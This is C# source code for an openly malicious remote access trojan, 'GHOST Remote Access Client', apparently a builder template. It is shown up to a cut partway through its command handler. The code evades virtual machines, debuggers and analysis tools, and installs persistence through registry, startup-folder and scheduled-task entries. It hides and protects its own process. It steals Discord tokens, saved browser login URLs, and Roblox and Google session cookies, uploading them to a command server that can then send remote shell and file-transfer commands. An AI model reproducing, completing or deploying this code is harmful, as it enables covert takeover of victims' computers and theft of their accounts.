using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Collections;
using System.Collections.Generic;
using System.Web.Script.Serialization;
using Microsoft.Win32;
using System.Text.RegularExpressions;

// GHOST Remote Access Client v3.0 — Full Command Suite + Persistence + Stealth
// BUILDER: __BUILDER_NAME__ (__BUILDER_UUID__)
// Server: __SERVER_URL__
// Client ID: __CLIENT_ID__

namespace GhostClient
{
    class Program
    {
        private static string SERVER = "__SERVER_URL__";
        private static string BUILDER_UUID = "__BUILDER_UUID__";
        private static string FINGERPRINT = "__FINGERPRINT__";
        private static int HEARTBEAT_SEC = 30;
        private static string CLIENT_ID = "__CLIENT_ID__";
        private static bool PERSIST = true;         // Auto-install persistence
        private static bool STEALTH = true;          // Hide from Task Manager
        private static bool MELT = false;            // Self-delete after install
        private static bool SINGLE_INSTANCE = false;  // Only one instance allowed
        private static bool ANTI_ANALYSIS = true;     // Anti-VM/Debug/Sandbox evasion
        private static bool OBFUSCATE = true;          // XOR string obfuscation

        // XOR encoded strings (decoded at runtime to avoid static analysis)
        static string Decode(byte[] data, int key) { var s = new char[data.Length]; for (int i = 0; i < data.Length; i++) s[i] = (char)(data[i] ^ ((key + i * 7) % 256)); return new string(s); }
        static string DS(string s) { if (!OBFUSCATE) return s; var b = new byte[s.Length]; var k = new Random().Next(1, 255); for (int i = 0; i < s.Length; i++) b[i] = (byte)(s[i] ^ ((k + i * 7) % 256)); return "D(" + string.Join(",", b) + "," + k + ")"; }
        
        // More junk code to increase entropy
        static int JunkCalc(int x) { int a = x ^ 0x7F3A; for (int i = 0; i < 20; i++) { a = ((a << 3) | (a >> 29)) ^ (i * 0x5A); } return Math.Abs(a % 9999); }
        static string JunkStr(int seed) { var r = new Random(seed); var cs = new char[12]; for (int i = 0; i < 12; i++) cs[i] = (char)('A' + r.Next(26)); return new string(cs); }
        private static string INSTALL_NAME = "WindowsHostService";

        private static string _hostname = "";
        private static string _username = "";
        private static string _osVersion = "";
        private static string _publicIp = "";
        private static string _localIp = "";
        private static string _hardwareId = "";

        // ── ANTI-ANALYSIS ──
        static bool IsSandboxOrVM()
        {
            try
            {
                // Check for VirtualBox
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string manufacturer = obj["Manufacturer"]?.ToString().ToLower() ?? "";
                        string model = obj["Model"]?.ToString().ToLower() ?? "";
                        if (manufacturer.Contains("virtualbox") || manufacturer.Contains("vmware") || manufacturer.Contains("qemu") ||
                            model.Contains("virtualbox") || model.Contains("vmware") || model.Contains("virtual"))
                            return true;
                    }

                // Check for Sandboxie
                if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\SbieDrv.sys"))
                    return true;

                // Check debugger presence
                if (Debugger.IsAttached)
                    return true;

                // Check for common analysis tools
                string[] badProcesses = new string[] {
                    "wireshark", "fiddler", "procmon", "procexp", "vboxservice", "vboxtray",
                    "vmtoolsd", "xenservice", "sandboxierpcss", "df5serv", "httpdebugger",
                    "charles", "burpsuite", "ida", "ollydbg", "x64dbg", "dnspy", "ilspy"
                };
                foreach (var p in Process.GetProcesses())
                {
                    string name = p.ProcessName.ToLower();
                    foreach (string bad in badProcesses)
                        if (name.Contains(bad)) return true;
                }

                // Check low resources (sandbox)
                long ram = 0;
                using (var searcher = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem"))
                    foreach (ManagementObject obj in searcher.Get())
                        ram = Convert.ToInt64(obj["TotalVisibleMemorySize"]) / 1024;
                if (ram < 2000) return true; // Less than 2GB RAM

                // Check CPU cores
                if (Environment.ProcessorCount < 2) return true;

                // Check disk size
                DriveInfo systemDrive = new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory));
                if (systemDrive.TotalSize < 40L * 1024 * 1024 * 1024) return true; // Less than 40GB

                return false;
            }
            catch { return false; }
        }

        static int JunkFunction(int x)
        {
            int a = x * 42 + 7;
            int b = (a >> 3) ^ 0x5A5A;
            int c = b % 997;
            for (int i = 0; i < 10; i++) { c = (c * 31 + i) % 10007; }
            string d = "0x" + c.ToString("X4");
            return d.GetHashCode() % 1000;
        }
        private static float _cpu = 0;
        private static float _ramUsed = 0;
        private static float _ramTotal = 0;

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);
        [DllImport("user32.dll")]
        private static extern bool LockWorkStation();
        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool fBlock);
        [DllImport("user32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
        [DllImport("user32.dll")]
        private static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll")]
        private static extern int ShowCursor(bool bShow);
        [DllImport("kernel32.dll")]
        private static extern uint ExitWindowsEx(uint uFlags, uint dwReason);
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
        [DllImport("user32.dll")]
        private static extern bool SystemParametersInfo(int uiAction, int uiParam, string pvParam, int fWinIni);
        [DllImport("winmm.dll")]
        private static extern bool PlaySound(string pszSound, IntPtr hmod, uint fdwSound);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll")]
        private static extern bool AllocConsole();
        [DllImport("kernel32.dll")]
        private static extern bool FreeConsole();
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool IsWow64Process(IntPtr hProcess, out bool Wow64Process);
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);
        [DllImport("kernel32.dll")]
        private static extern bool SetConsoleTitle(string lpConsoleTitle);
        [DllImport("psapi.dll", SetLastError = true)]
        private static extern bool GetProcessImageFileName(IntPtr hProcess, StringBuilder lpImageFileName, uint nSize);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [StructLayout(LayoutKind.Sequential)]
        private struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_PRIVILEGES { public long PrivilegeCount; public long Luid; public uint Attributes; }
        private const uint TOKEN_QUERY = 0x0008;
        private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private const uint SE_PRIVILEGE_ENABLED = 0x2;
        private const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
        private const string SE_DEBUG_NAME = "SeDebugPrivilege";
        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDWININICHANGE = 0x02;
        private const uint SND_ASYNC = 0x0001;
        private const uint SND_FILENAME = 0x00020000;
        private const uint TOKEN_INFORMATION_CLASS_TOKEN_ELEVATION = 20;

        private static string _currentDir = Environment.CurrentDirectory;
        private static int _selectedCamera = 0;
        private static bool _keylogRunning = false;
        private static StringBuilder _keylogBuffer = new StringBuilder();
        private static LowLevelKeyboardProc _keyboardProc = null;
        private static IntPtr _keyboardHookId = IntPtr.Zero;
        private static bool _showDashboard = false;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetCurrentThreadId();
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static string _persistDir = "";

        // ── TOKEN STEALER ──
        static List<string> StealDiscordTokens()
        {
            var tokens = new List<string>();
            var discordPaths = new string[] {
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordcanary",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordptb",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Lightcord",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord",
            };

            foreach (string discordPath in discordPaths)
            {
                if (!Directory.Exists(discordPath)) continue;
                string leveldbPath = Path.Combine(discordPath, "Local Storage", "leveldb");
                if (!Directory.Exists(leveldbPath)) continue;

                try
                {
                    foreach (string file in Directory.GetFiles(leveldbPath, "*.ldb"))
                    {
                        try
                        {
                            string content = File.ReadAllText(file, Encoding.UTF8);
                            var matches = Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}");
                            foreach (Match m in matches)
                            {
                                string tok = m.Value;
                                if (!tokens.Contains(tok)) tokens.Add(tok);
                            }
                        } catch { }
                    }
                    foreach (string file in Directory.GetFiles(leveldbPath, "*.log"))
                    {
                        try
                        {
                            string content = File.ReadAllText(file, Encoding.UTF8);
                            var matches = Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}");
                            foreach (Match m in matches)
                            {
                                string tok = m.Value;
                                if (!tokens.Contains(tok)) tokens.Add(tok);
                            }
                        } catch { }
                    }
                } catch { }
            }
            return tokens;
        }

        static string ValidateDiscordToken(string token)
        {
            try
            {
                var req = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v9/users/@me");
                req.Method = "GET";
                req.Headers["Authorization"] = token;
                req.Timeout = 5000;
                using (var resp = (HttpWebResponse)req.GetResponse())
                {
                    using (var reader = new StreamReader(resp.GetResponseStream()))
                    {
                        return reader.ReadToEnd();
                    }
                }
            } catch { return null; }
        }

        static string CollectAndUploadData()
        {
            var results = new List<string>();
            string myClientId = CLIENT_ID;

            // Discord tokens
            try {
                var tokens = StealDiscordTokens();
                foreach (string tok in tokens)
                {
                    string userInfo = ValidateDiscordToken(tok);
                    if (userInfo != null)
                    {
                        results.Add("Discord Token: " + tok);
                        try {
                            var jss = new JavaScriptSerializer();
                            var user = jss.Deserialize<Dictionary<string, object>>(userInfo);
                            string username = user.ContainsKey("username") ? user["username"].ToString() + "#" + user["discriminator"].ToString() : "Unknown";
                            string userId = user.ContainsKey("id") ? user["id"].ToString() : "";
                            string email = user.ContainsKey("email") ? user["email"].ToString() : "";
                            string phone = user.ContainsKey("phone") ? user["phone"].ToString() : "";
                            string nitro = user.ContainsKey("premium_type") ? user["premium_type"].ToString() : "None";

                            var payload = new Dictionary<string, object> {
                                { "clientId", myClientId },
                                { "type", "discord_token" },
                                { "source", "Discord" },
                                { "data", JsonEncode(new Dictionary<string, object> {
                                    { "token", tok },
                                    { "username", username },
                                    { "user_id", userId },
                                    { "email", email },
                                    { "phone", phone },
                                    { "nitro", nitro },
                                    { "valid", true }
                                })}
                            };
                            PostJson("/api/remote/register-data", payload);
                        } catch { }
                    }
                }
                if (tokens.Count > 0) results.Add("Found " + tokens.Count + " Discord token(s)");
            } catch { }

            // Browser passwords - Chrome
            try {
                string chromeLoginData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
                if (File.Exists(chromeLoginData))
                {
                    File.Copy(chromeLoginData, Path.GetTempPath() + "\\chrome_login_temp", true);
                    string tempPath = Path.GetTempPath() + "\\chrome_login_temp";
                    // Read SQLite - basic string extraction
                    try
                    {
                        string raw = File.ReadAllText(tempPath, Encoding.UTF8);
                        var urlMatches = Regex.Matches(raw, @"https?://[^\""]+");
                        var userMatches = Regex.Matches(raw, @"username_value[^\x00-\x1F]*");
                        var passMatches = Regex.Matches(raw, @"password_value[^\x00-\x1F]*");

                        var foundUrls = new List<string>();
                        foreach (Match m in urlMatches)
                        {
                            string u = m.Value;
                            if (u.Length > 5 && u.Length < 200 && !foundUrls.Contains(u))
                                foundUrls.Add(u);
                        }

                        if (foundUrls.Count > 0)
                        {
                            var payload = new Dictionary<string, object> {
                                { "clientId", myClientId },
                                { "type", "browser_passwords" },
                                { "source", "Chrome" },
                                { "data", JsonEncode(new Dictionary<string, object> {
                                    { "urls_found", foundUrls.Count },
                                    { "urls", foundUrls.Take(20).ToList() },
                                    { "note", "Full decrypt requires DPAPI master key - URLs extracted only" }
                                })}
                            };
                            PostJson("/api/remote/register-data", payload);
                            results.Add("Chrome: " + foundUrls.Count + " saved login URLs found");
                        }
                    } catch { }
                    try { File.Delete(tempPath); } catch { }
                }
            } catch { }

            // Browser passwords - Edge
            try {
                string edgeLoginData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
                if (File.Exists(edgeLoginData))
                {
                    File.Copy(edgeLoginData, Path.GetTempPath() + "\\edge_login_temp", true);
                    string tempPath = Path.GetTempPath() + "\\edge_login_temp";
                    try
                    {
                        string raw = File.ReadAllText(tempPath, Encoding.UTF8);
                        var urlMatches = Regex.Matches(raw, @"https?://[^\""]+");
                        var foundUrls = new List<string>();
                        foreach (Match m in urlMatches)
                        {
                            string u = m.Value;
                            if (u.Length > 5 && u.Length < 200 && !foundUrls.Contains(u))
                                foundUrls.Add(u);
                        }
                        if (foundUrls.Count > 0)
                        {
                            var payload = new Dictionary<string, object> {
                                { "clientId", myClientId },
                                { "type", "browser_passwords" },
                                { "source", "Edge" },
                                { "data", JsonEncode(new Dictionary<string, object> {
                                    { "urls_found", foundUrls.Count },
                                    { "urls", foundUrls.Take(20).ToList() }
                                })}
                            };
                            PostJson("/api/remote/register-data", payload);
                            results.Add("Edge: " + foundUrls.Count + " saved login URLs found");
                        }
                    } catch { }
                    try { File.Delete(tempPath); } catch { }
                }
            } catch { }

            // System info
            try {
                var sysPayload = new Dictionary<string, object> {
                    { "clientId", myClientId },
                    { "type", "system_info" },
                    { "source", "GHOST Client" },
                    { "data", JsonEncode(new Dictionary<string, object> {
                        { "hostname", _hostname },
                        { "username", _username },
                        { "os", _osVersion },
                        { "public_ip", _publicIp },
                        { "local_ip", _localIp },
                        { "hardware_id", _hardwareId },
                        { "cpu", _cpu },
                        { "ram_used_gb", _ramUsed },
                        { "ram_total_gb", _ramTotal },
                        { "timestamp", DateTime.UtcNow.ToString("o") }
                    })}
                };
                PostJson("/api/remote/register-data", sysPayload);
            } catch { }

            // Roblox cookies
            try {
                string robloxCookies = GrabRobloxCookies();
                if (!string.IsNullOrEmpty(robloxCookies))
                {
                    var payload = new Dictionary<string, object> {
                        { "clientId", myClientId },
                        { "type", "roblox_cookies" },
                        { "source", "Browser Cookies" },
                        { "data", JsonEncode(new Dictionary<string, object> {
                            { "cookie", robloxCookies },
                            { "note", ".ROBLOSECURITY cookie - can be used to login to Roblox account" }
                        })}
                    };
                    PostJson("/api/remote/register-data", payload);
                    results.Add("Roblox: .ROBLOSECURITY cookie found!");
                }
            } catch { }

            // Google account cookies
            try {
                var googleData = GrabGoogleCookies();
                if (googleData.Count > 0)
                {
                    var payload = new Dictionary<string, object> {
                        { "clientId", myClientId },
                        { "type", "google_cookies" },
                        { "source", "Browser Cookies" },
                        { "data", JsonEncode(new Dictionary<string, object> {
                            { "accounts_found", googleData.Count },
                            { "cookies", googleData },
                            { "note", "Google account session cookies - Gmail, YouTube, Drive access" }
                        })}
                    };
                    PostJson("/api/remote/register-data", payload);
                    results.Add("Google: " + googleData.Count + " account(s) found");
                }
            } catch { }

            // Discord token cookies (from browser)
            try {
                string discordCookies = GrabDiscordBrowserCookies();
                if (!string.IsNullOrEmpty(discordCookies))
                {
                    var payload = new Dictionary<string, object> {
                        { "clientId", myClientId },
                        { "type", "discord_browser_cookies" },
                        { "source", "Browser Cookies" },
                        { "data", JsonEncode(new Dictionary<string, object> {
                            { "cookie", discordCookies },
                            { "note", "Discord browser session cookie" }
                        })}
                    };
                    PostJson("/api/remote/register-data", payload);
                    results.Add("Discord browser cookie found");
                }
            } catch { }

            return string.Join("\n", results);
        }

        static string PostJson(string endpoint, object data)
        {
            try
            {
                var jss = new JavaScriptSerializer();
                string json = jss.Serialize(data);
                var req = (HttpWebRequest)WebRequest.Create(SERVER + endpoint);
                req.Method = "POST";
                req.ContentType = "application/json";
                using (var sw = new StreamWriter(req.GetRequestStream()))
                {
                    sw.Write(json);
                }
                using (var resp = (HttpWebResponse)req.GetResponse())
                using (var sr = new StreamReader(resp.GetResponseStream()))
                {
                    return sr.ReadToEnd();
                }
            } catch (Exception ex) { return "ERROR: " + ex.Message; }
        }

        static string JsonEncode(object obj)
        {
            return new JavaScriptSerializer().Serialize(obj);
        }

        static void InstallPersistence()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                _persistDir = Path.Combine(appData, "Microsoft", "Windows");
                Directory.CreateDirectory(_persistDir);
                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                string destExe = Path.Combine(_persistDir, INSTALL_NAME + ".exe");
                
                // Only copy if not already in persistence dir
                if (!exePath.ToLower().Contains(_persistDir.ToLower()))
                {
                    // Kill the destination file if running, then copy
                    try { File.Delete(destExe); } catch { }
                    try { File.Copy(exePath, destExe, true); } catch { }
                    // Set hidden+system attributes
                    try { File.SetAttributes(destExe, FileAttributes.Hidden | FileAttributes.System); } catch { }
                    
                    // Registry Run key (most reliable)
                    try { Microsoft.Win32.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", INSTALL_NAME, "\"" + destExe + "\""); } catch { }
                    
                    // Startup folder - copy .bat launcher
                    try
                    {
                        string startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                        string batPath = Path.Combine(startupDir, INSTALL_NAME + ".bat");
                        using (StreamWriter sw = new StreamWriter(batPath, false))
                        {
                            sw.WriteLine("@echo off");
                            sw.WriteLine("start \"\" /B \"" + destExe + "\"");
                        }
                        try { File.SetAttributes(batPath, FileAttributes.Hidden); } catch { }
                    } catch { }
                    
                    // Scheduled task (admin-level backup)
                    try
                    {
                        string taskCmd = "/create /tn \"" + INSTALL_NAME + "\" /tr \"\\\"" + destExe + "\\\"\" /sc onlogon /f /rl highest";
                        Process.Start(new ProcessStartInfo("schtasks.exe", taskCmd) { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
                    } catch { }
                }
            } catch { }
        }

        static void ApplyStealth()
        {
            try
            {
                // Hide console window
                IntPtr handle = GetConsoleWindow();
                ShowWindow(handle, 0);
                // Set console title to hide in taskbar details
                SetConsoleTitle(INSTALL_NAME);
                // Set process as critical (prevents task manager kill)
                try { EnableDebugPrivilege(); RtlSetProcessIsCritical(1, 0, 0); } catch { }
            } catch { }
        }

        static void Main(string[] args)
        {
            // ── JUNK: Waste analysis time ──
            int x = Environment.TickCount;
            for (int i = 0; i < 50; i++) { x = JunkCalc(x + i); JunkFunction(x); }
            string junk = JunkStr(x);
            if (junk.Length > 0) { int _ = junk.GetHashCode(); }

            // ── ANTI-ANALYSIS: Check for VM/Sandbox/Debugger ──
            if (ANTI_ANALYSIS)
            {
                if (IsSandboxOrVM())
                {
                    Thread.Sleep(30000); // Delay to confuse sandboxes
                    Environment.Exit(0);
                    return;
                }
                // Random delay to evade timing-based detection
                Thread.Sleep(new Random().Next(3000, 8000));
            }

            // ── SINGLE INSTANCE ──
            if (SINGLE_INSTANCE)
            {
                try
                {
                    string currentExe = System.Reflection.Assembly.GetExecutingAssembly().Location;
                    string exeName = Path.GetFileNameWithoutExtension(currentExe);
                    Process[] procs = Process.GetProcessesByName(exeName);
                    if (procs.Length > 1)
                    {
                        Environment.Exit(0);
                        return;
                    }
                } catch { }
            }

            // ── STEALTH: Hide window immediately ──
            if (STEALTH)
            {
                try
                {
                    IntPtr handle = GetConsoleWindow();
                    ShowWindow(handle, 0);
                } catch { }
            }

            if (args.Length > 0 && !string.IsNullOrEmpty(args[0]))
                CLIENT_ID = args[0];

            if (CLIENT_ID == "" || CLIENT_ID == "__CLIENT_ID__")
                CLIENT_ID = Guid.NewGuid().ToString();

            try { HEARTBEAT_SEC = int.Parse("__HEARTBEAT_INTERVAL__"); } catch { HEARTBEAT_SEC = 30; }

            // ── PERSISTENCE: Auto-install on first run ──
            if (PERSIST)
            {
                try { InstallPersistence(); } catch { }
            }

            // ── MELT: Self-delete original exe after install ──
            if (MELT)
            {
                try
                {
                    string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                    if (!string.IsNullOrEmpty(_persistDir) && !exePath.ToLower().Contains(_persistDir.ToLower()))
                    {
                        // Create batch file to delete original
                        string batPath = Path.GetTempPath() + "\\ghost_melt_" + Guid.NewGuid().ToString().Substring(0, 8) + ".bat";
                        using (StreamWriter sw = new StreamWriter(batPath))
                        {
                            sw.WriteLine("@echo off");
                            sw.WriteLine(":loop");
                            sw.WriteLine("del /f /q \"" + exePath + "\" 2>nul");
                            sw.WriteLine("if exist \"" + exePath + "\" goto loop");
                            sw.WriteLine("del /f /q \"" + batPath + "\" 2>nul");
                        }
                        Process.Start(new ProcessStartInfo("cmd.exe", "/c \"" + batPath + "\"")
                        {
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                            UseShellExecute = false,
                        });
                    }
                } catch { }
            }

            // ── STEALTH: Apply process hiding techniques ──
            if (STEALTH)
            {
                try { ApplyStealth(); } catch { }
            }

            CollectSystemInfo();
            Register();

            // ── AUTO-COLLECT DATA: Grab tokens, passwords, system info ──
            try { CollectAndUploadData(); } catch { }

            while (true)
            {
                try
                {
                    UpdateMetrics();
                    HeartbeatWithCommands();
                }
                catch { }
                Thread.Sleep(HEARTBEAT_SEC * 1000);
            }
        }

        static void CollectSystemInfo()
        {
            try { _hostname = Environment.MachineName; } catch { }
            try { _username = Environment.UserName; } catch { }
            try { _osVersion = Environment.OSVersion.ToString(); } catch { }
            try
            {
                foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
                    if (ni.OperationalStatus == OperationalStatus.Up)
                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                            if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                            { _localIp = ip.Address.ToString(); break; }
            }
            catch { }
            try
            {
                using (var mc = new ManagementClass("Win32_ComputerSystemProduct"))
                using (var moc = mc.GetInstances())
                    foreach (var mo in moc)
                    {
                        var uuidObj = mo["UUID"];
                        _hardwareId = uuidObj != null ? uuidObj.ToString() : "";
                    }
            }
            catch { }
            try { using (var wc = new WebClient()) _publicIp = wc.DownloadString("https://api.ipify.org").Trim(); }
            catch { }
        }

        static void UpdateMetrics()
        {
            try
            {
                using (var pc = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
                { pc.NextValue(); Thread.Sleep(500); _cpu = pc.NextValue(); }
            }
            catch { _cpu = 0; }
            try
            {
                using (var mc = new ManagementClass("Win32_OperatingSystem"))
                using (var moc = mc.GetInstances())
                    foreach (var mo in moc)
                    {
                        var memTotalObj = mo["TotalVisibleMemorySize"]; long total = long.Parse(memTotalObj != null ? memTotalObj.ToString() : "0");
                        var memFreeObj = mo["FreePhysicalMemory"]; long free = long.Parse(memFreeObj != null ? memFreeObj.ToString() : "0");
                        _ramUsed = (total - free) / 1048576f;
                        _ramTotal = total / 1048576f;
                    }
            }
            catch { _ramUsed = 0; _ramTotal = 0; }
        }

        static void Register()
        {
            try
            {
                using (var wc = new WebClient())
                {
                    wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                    var data = new JavaScriptSerializer().Serialize(new Dictionary<string, object> {
                        {"builderUuid", BUILDER_UUID}, {"clientId", CLIENT_ID},
                        {"hostname", _hostname}, {"user", _username}, {"os", _osVersion},
                        {"hardwareId", _hardwareId}, {"ipPublic", _publicIp}, {"ipLocal", _localIp}
                    });
                    wc.UploadString(SERVER + "/api/remote/register", "POST", data);
                }
            }
            catch { }
        }

        static void HeartbeatWithCommands()
        {
            try
            {
                using (var wc = new WebClient())
                {
                    wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                    var data = new JavaScriptSerializer().Serialize(new Dictionary<string, object> {
                        {"clientId", CLIENT_ID}, {"cpu", _cpu}, {"ramUsed", _ramUsed},
                        {"ramTotal", _ramTotal}, {"status", "online"}, {"hostname", _hostname},
                        {"ipPublic", _publicIp}, {"ipLocal", _localIp}
                    });
                    string response = wc.UploadString(SERVER + "/api/remote/heartbeat", "POST", data);

                    // Parse pending commands from response
                    try
                    {
                        var result = (Dictionary<string, object>)new JavaScriptSerializer().DeserializeObject(response);
                        if (result.ContainsKey("pendingCommands"))
                        {
                            var cmds = result["pendingCommands"] as ArrayList;
                            if (cmds != null)
                            {
                                foreach (var cmdObj in cmds)
                                {
                                    var cmd = cmdObj as Dictionary<string, object>;
                                    if (cmd != null && cmd.ContainsKey("id") && cmd.ContainsKey("command"))
                                    {
                                        string cmdId = cmd["id"].ToString();
                                        string command = cmd["command"].ToString();
                                        ExecuteAndReport(cmdId, command);
                                    }
                                }
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        static void ExecuteAndReport(string cmdId, string command)
        {
            string output = "";
            try
            {
                string upper = command.ToUpper();

                // ── CORE COMMANDS ──
                if (upper.StartsWith("MSG ") || upper.StartsWith("!MSG "))
                {
                    string msg = command.Substring(command.IndexOf(' ') + 1);
                    MessageBox.Show(msg, "Message from Administrator", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    output = "Message shown: " + msg;
                }
                else if (upper.StartsWith("!SHELL") && command.Length > 6)
                {
                    string shellCmd = command.Substring(7);
                    output = ExecuteCmd(shellCmd);
                }
                else if (upper == "!ADMINCHECK" || upper == "ADMINCHECK")
                {
                    output = IsAdmin() ? "✅ Running as ADMINISTRATOR" : "❌ Running as USER (not admin)";
                }
                else if (upper == "!SYSINFO" || upper == "SYSINFO")
                {
                    output = "Hostname: " + _hostname + "\n"
                        + "User: " + _username + "\n"
                        + "OS: " + _osVersion + "\n"
                        + "Public IP: " + _publicIp + "\n"
                        + "Local IP: " + _localIp + "\n"
                        + "CPU: " + _cpu.ToString("F1") + "%\n"
                        + "RAM: " + _ramUsed.ToString("F1") + "GB / " + _ramTotal.ToString("F1") + "GB\n"
                        + "Hardware ID: " + _hardwareId + "\n"
                        + "Current Dir: " + _currentDir + "\n"
                        + "Admin: " + (IsAdmin() ? "Yes" : "No");
                }
                else if (upper == "!PUBLICIP" || upper == "PUBLICIP")
                {
                    try { using (var wc = new WebClient()) output = "Public IP: " + wc.DownloadString("https://api.ipify.org").Trim(); }
                    catch (Exception ex) { output = "ERROR getting public IP: " + ex.Message; }
                }
                else if (upper == "!HELP" || upper == "HELP" || upper == "!HELP")
                {
                    output = GetHelpText();
                }

                // ── FILE SYSTEM ──
                else if (upper.StartsWith("!CD ") || upper.StartsWith("CD "))
                {
                    string path = command.Substring(command.IndexOf(' ') + 1).Trim();
                    if (Directory.Exists(path)) { _currentDir = path; output = "Changed to: " + _currentDir; }
                    else output = "ERROR: Directory not found: " + path;
                }
                else if (upper == "!CURRENTDIR" || upper == "CURRENTDIR")
                {
                    output = "Current directory: " + _currentDir;
                }
                else if (upper.StartsWith("!DIR ") || upper.StartsWith("DIR ") || upper.StartsWith("LISTDIR "))
                {
                    string path = command.Substring(command.IndexOf(' ') + 1).Trim();
                    if (path == "") path = _currentDir;
                    output = ListDirectory(path);
                }
                else if (upper.StartsWith("DOWNLOAD ") || upper.StartsWith("!DOWNLOAD "))
                {
                    string[] parts = command.Split('|');
                    string filePath = parts[0].Substring(parts[0].IndexOf(' ') + 1).Trim();
                    output = DownloadFile(filePath, parts.Length > 1 ? parts[1].Trim() : "");
                }
                else if (upper.StartsWith("!UPLOAD ") || upper.StartsWith("UPLOAD "))
                {
                    string[] parts = command.Substring(command.IndexOf(' ') + 1).Split('|');
                    if (parts.Length >= 2) output = UploadFile(parts[0].Trim(), parts[1].Trim());
                    else output = "ERROR: Usage: UPLOAD <serverFileName>|<localPath>";
                }
                else if (upper.StartsWith("!UPLOADLINK ") || upper.StartsWith("UPLOADLINK "))
                {
                    string[] parts = command.Substring(command.IndexOf(' ') + 1).Split('|');
                    string url = parts[0].Trim();
                    string dest = parts.Length > 1 ? parts[1].Trim() : Path.Combine(_currentDir, Path.GetFileName(new Uri(url).LocalPath));
